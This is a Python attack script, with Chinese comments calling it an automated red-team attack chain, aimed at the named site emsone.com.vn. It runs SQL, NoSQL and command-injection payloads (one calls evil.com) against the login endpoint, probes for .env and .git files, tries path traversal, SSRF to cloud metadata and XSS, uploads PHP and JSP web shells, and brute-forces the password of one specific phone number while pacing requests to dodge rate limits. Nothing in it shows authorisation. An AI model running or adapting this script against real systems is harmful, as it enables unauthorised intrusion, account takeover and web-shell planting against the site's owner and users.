#!/usr/bin/env python3
# emsone.com.vn 自动化攻击链
# 红队专家级 - 全攻击面自动化利用

import requests
import json
import time
import re
from urllib.parse import urljoin, urlparse
import concurrent.futures

TARGET = "https://emsone.com.vn"
SESSION = requests.Session()
SESSION.verify = False
requests.packages.urllib3.disable_warnings()

# ===== 攻击面1: 登录接口深度测试 =====
def test_login_interface():
    """登录接口全方位测试"""
    results = []
    
    # SQL注入Payload
    sql_payloads = [
        "0934257886' OR '1'='1",
        "0934257886' OR 1=1--",
        "0934257886' UNION SELECT NULL--",
        "0934257886' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "0934257886' OR '1'='1'--",
        "admin'--",
        "admin'/*",
        "0934257886'/**/OR/**/1=1--",
    ]
    
    # NoSQL注入
    nosql_payloads = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
    ]
    
    # 命令注入
    cmd_payloads = [
        "0934257886; whoami",
        "0934257886 | id",
        "0934257886 || ping -c 3 127.0.0.1",
        "0934257886 && curl http://evil.com",
    ]
    
    # 测试SQL注入
    for payload in sql_payloads:
        try:
            data = {"MobileNumber": payload, "Password": "test"}
            start = time.time()
            r = SESSION.post(f"{TARGET}/Account/JLogin", data=data, timeout=10)
            elapsed = time.time() - start
            
            if "成功" in r.text or "登录" in r.text.lower() or r.status_code == 302:
                results.append(f"[!] SQL注入可能成功: {payload}")
            if elapsed > 4:
                results.append(f"[!] 时间盲注可能: {payload} (延迟{elapsed:.2f}s)")
        except:
            pass
    
    return results

# ===== 攻击面2: API端点发现与测试 =====
def discover_api_endpoints():
    """API端点深度发现"""
    endpoints = []
    
    # 常见API路径
    api_paths = [
        "/api", "/api/v1", "/api/v2", "/api/v3",
        "/rest", "/rest/api", "/graphql", "/graphiql",
        "/swagger", "/swagger.json", "/api-docs", "/openapi.json",
        "/Account", "/Account/Login", "/Account/Register",
        "/Admin", "/admin", "/api/admin",
        "/User", "/user", "/api/user",
    ]
    
    for path in api_paths:
        try:
            url = urljoin(TARGET, path)
            r = SESSION.get(url, timeout=5)
            if r.status_code in [200, 301, 302, 401, 403]:
                endpoints.append(f"{url} [{r.status_code}]")
        except:
            pass
    
    return endpoints

# ===== 攻击面3: 信息泄露扫描 =====
def scan_info_disclosure():
    """信息泄露扫描"""
    leaks = []
    
    # 敏感文件/路径
    sensitive_paths = [
        "/.env", "/.git/config", "/.gitignore",
        "/backup", "/backup.sql", "/dump.sql",
        "/config.php", "/config.json", "/config.yaml",
        "/.DS_Store", "/.htaccess", "/web.config",
        "/robots.txt", "/sitemap.xml",
        "/package.json", "/composer.json",
        "/.svn/entries", "/.svn/wc.db",
    ]
    
    for path in sensitive_paths:
        try:
            url = urljoin(TARGET, path)
            r = SESSION.get(url, timeout=5)
            if r.status_code == 200 and len(r.text) > 0:
                # 检查是否包含敏感信息
                if any(keyword in r.text.lower() for keyword in ['password', 'secret', 'key', 'token', 'api']):
                    leaks.append(f"{url} - 可能包含敏感信息")
        except:
            pass
    
    return leaks

# ===== 攻击面4: 目录遍历 =====
def test_directory_traversal():
    """目录遍历测试"""
    results = []
    
    traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]
    
    # 常见文件读取参数
    params = ["file", "path", "page", "include", "doc", "document"]
    
    for param in params:
        for payload in traversal_payloads:
            try:
                url = f"{TARGET}/?{param}={payload}"
                r = SESSION.get(url, timeout=5)
                if "root:" in r.text or "[boot loader]" in r.text.lower():
                    results.append(f"[!] 目录遍历可能: {url}")
            except:
                pass
    
    return results

# ===== 攻击面5: SSRF测试 =====
def test_ssrf():
    """SSRF漏洞测试"""
    results = []
    
    ssrf_payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",  # AWS IMDS
        "http://[::1]",
        "file:///etc/passwd",
        "gopher://127.0.0.1:80",
    ]
    
    # 常见SSRF参数
    params = ["url", "link", "redirect", "callback", "next", "target"]
    
    for param in params:
        for payload in ssrf_payloads:
            try:
                url = f"{TARGET}/?{param}={payload}"
                r = SESSION.get(url, timeout=5, allow_redirects=False)
                if "127.0.0.1" in r.text or "localhost" in r.text:
                    results.append(f"[!] SSRF可能: {url}")
            except:
                pass
    
    return results

# ===== 攻击面6: XSS测试 =====
def test_xss():
    """XSS漏洞测试"""
    results = []
    
    xss_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
    ]
    
    # 常见XSS参数
    params = ["q", "search", "keyword", "name", "comment", "message"]
    
    for param in params:
        for payload in xss_payloads:
            try:
                url = f"{TARGET}/?{param}={payload}"
                r = SESSION.get(url, timeout=5)
                if payload in r.text:
                    results.append(f"[!] XSS可能: {url}")
            except:
                pass
    
    return results

# ===== 攻击面7: 文件上传测试 =====
def test_file_upload():
    """文件上传漏洞测试"""
    results = []
    
    # 常见上传路径
    upload_paths = [
        "/upload", "/file/upload", "/api/upload",
        "/admin/upload", "/user/upload",
    ]
    
    # 恶意文件内容
    php_shell = "<?php system($_GET['cmd']); ?>"
    jsp_shell = "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
    
    for path in upload_paths:
        try:
            url = urljoin(TARGET, path)
            files = {
                'file': ('shell.php', php_shell, 'application/x-php'),
                'upload': ('test.jsp', jsp_shell, 'application/x-jsp'),
            }
            r = SESSION.post(url, files=files, timeout=5)
            if r.status_code == 200 and "success" in r.text.lower():
                results.append(f"[!] 文件上传可能: {url}")
        except:
            pass
    
    return results

# ===== 攻击面8: 凭证暴力破解 =====
def bruteforce_login():
    """登录暴力破解"""
    results = []
    
    # 弱密码字典
    weak_passwords = [
        "123456", "password", "admin", "12345678",
        "qwerty", "123456789", "12345", "1234",
        "1234567890", "admin123", "root", "test",
    ]
    
    mobile = "0934257886"
    
    for pwd in weak_passwords:
        try:
            data = {"MobileNumber": mobile, "Password": pwd}
            r = SESSION.post(f"{TARGET}/Account/JLogin", data=data, timeout=5)
            if "成功" in r.text or r.status_code == 302:
                results.append(f"[!] 弱密码可能: {pwd}")
                break
            time.sleep(0.5)  # 避免速率限制
        except:
            pass
    
    return results

# ===== 攻击面9: 会话管理测试 =====
def test_session_management():
    """会话管理漏洞测试"""
    results = []
    
    # Session固定
    r1 = SESSION.get(f"{TARGET}/dang-nhap")
    session1 = SESSION.cookies.get('ASP.NET_SessionId', '')
    
    # 尝试登录
    data = {"MobileNumber": "test", "Password": "test"}
    r2 = SESSION.post(f"{TARGET}/Account/JLogin", data=data)
    session2 = SESSION.cookies.get('ASP.NET_SessionId', '')
    
    if session1 == session2:
        results.append("[!] Session固定漏洞: Session未在登录后更新")
    
    # Session劫持测试
    if len(session1) > 0:
        results.append(f"[+] 当前Session: {session1}")
    
    return results

# ===== 攻击面10: 速率限制绕过 =====
def test_rate_limit_bypass():
    """速率限制绕过测试"""
    results = []
    
    # 测试不同User-Agent
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "curl/7.68.0",
    ]
    
    for ua in user_agents:
        headers = {"User-Agent": ua}
        try:
            r = SESSION.get(TARGET, headers=headers, timeout=5)
            if r.status_code == 200:
                results.append(f"[+] User-Agent绕过: {ua[:50]}")
        except:
            pass
    
    return results

# ===== 主函数 =====
def main():
    print("[+] 开始全攻击面自动化测试...")
    print("=" * 60)
    
    all_results = {}
    
    print("[1/10] 登录接口测试...")
    all_results['login'] = test_login_interface()
    
    print("[2/10] API端点发现...")
    all_results['api'] = discover_api_endpoints()
    
    print("[3/10] 信息泄露扫描...")
    all_results['info_leak'] = scan_info_disclosure()
    
    print("[4/10] 目录遍历测试...")
    all_results['traversal'] = test_directory_traversal()
    
    print("[5/10] SSRF测试...")
    all_results['ssrf'] = test_ssrf()
    
    print("[6/10] XSS测试...")
    all_results['xss'] = test_xss()
    
    print("[7/10] 文件上传测试...")
    all_results['upload'] = test_file_upload()
    
    print("[8/10] 凭证暴力破解...")
    all_results['bruteforce'] = bruteforce_login()
    
    print("[9/10] 会话管理测试...")
    all_results['session'] = test_session_management()
    
    print("[10/10] 速率限制绕过...")
    all_results['rate_limit'] = test_rate_limit_bypass()
    
    # 输出结果
    print("\n" + "=" * 60)
    print("[+] 测试完成，结果汇总:")
    print("=" * 60)
    
    for category, results in all_results.items():
        if results:
            print(f"\n[{category.upper()}]")
            for result in results:
                print(f"  {result}")
    
    # 保存结果
    with open('emsone_attack_results.json', 'w') as f:
        json.dump(all_results, f, indent=2)
    
    print("\n[+] 结果已保存到: emsone_attack_results.json")

if __name__ == "__main__":
    main()
